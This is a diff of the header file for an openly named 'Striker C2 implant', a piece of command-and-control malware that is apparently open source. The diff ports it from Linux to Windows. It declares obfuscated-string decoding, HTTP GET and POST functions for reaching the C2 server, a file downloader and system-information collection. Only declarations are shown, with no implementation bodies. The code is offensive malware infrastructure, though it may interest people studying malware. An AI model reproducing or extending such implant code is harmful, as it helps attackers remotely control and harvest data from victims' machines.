@@ -1,17 +1,18 @@
 /**
- *----------------------------------------------------
- * Header file for the Striker C2 implant for linux.
- * This should be included ONLY by the striker.c file.
- *                                  Author: Umar Abdul
- *----------------------------------------------------
+ *--------------------------------------------------------------------
+ * Header file for the Striker C2 implant for linux and windows hosts.
+ *                                                  Author: Umar Abdul
+ *--------------------------------------------------------------------
  */
 
 #ifndef STRIKER_H
 #define STRIKER_H
 
 #ifdef __WIN32__
-  #include <windows.h>
   #define IS_WINDOWS
+  #include <windows.h>
+  #include <wininet.h>
+  #define PATH_MAX 256
 #else
   #define IS_LINUX
 #endif
@@ -34,8 +35,6 @@
   #include <curl/curl.h>
   #include <sys/select.h>
   #include <linux/input.h>
-#else
-  #define PATH_MAX 256
 #endif
 
 // A struct for tracking session info.
@@ -63,18 +62,26 @@ typedef struct{
   task *tsk;
 } task_wrapper;
 
+
 // For decoding obfuscated strings.
 char *obfs_decode(char *str);
 
-#ifdef IS_LINUX
-  /**
-   * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
-   * If `absolute` is non-zero, `path` will be treated as absolute URL.
-   * It does not define any headers.
-   * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
-   */
-  CURL *init_curl(const char *path, buffer *buff, unsigned char absolute);
+// Used for parsing URL.
+typedef enum {HTTP, HTTPS} URL_PROTO;
 
+// Extract the protocol, hostname, port, and path of a URL.
+void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path);
+
+/**
+ * Make a GET request to `url`, save response body to `body`, and return the status code.
+ * If `url` starts with a "/", it will be treated as a relative path to the active C2 server.
+ */
+int http_get(char *url, buffer *body);
+
+// Same as above, but for POST requests. `data` is the POST data (JSON), and response will be written to `body` 
+int http_post(char *url, cJSON *data, buffer *body);
+
+#ifdef IS_LINUX
   /**
    * Callback function for curl to receive response body inside a buffer.
    * This may be called multiple times with chunks of data, depending on the size of the body.
@@ -85,6 +92,8 @@ char *obfs_decode(char *str);
   size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
 #endif
 
+// Extract the host and port in a URL.
+void get_url_host_port(char *url, char *host, int *port);
 
 // Return a json object containing system information.
 cJSON *sysinfo();
